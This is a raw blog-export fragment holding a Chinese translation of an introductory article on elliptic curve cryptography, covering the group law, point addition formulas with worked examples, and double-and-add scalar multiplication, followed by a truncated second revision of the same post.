[chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"scalar-multiplication\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p>\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[10,47],[1,\"p\",[]]]}","created_at_ts":1577086494887,"created_at":"2019-12-23 07:34:54"},{"id":"5e006e992ee0ee00018198e1","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 